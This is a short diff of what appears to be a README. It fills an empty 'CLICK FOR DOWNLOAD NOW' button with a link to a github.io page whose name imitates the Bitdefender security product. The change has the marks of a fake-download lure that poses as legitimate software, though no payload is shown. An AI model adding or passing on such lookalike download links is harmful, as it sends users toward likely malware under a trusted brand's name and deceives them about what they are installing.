@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://bitdefenderty-pcwinmac-wd84.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
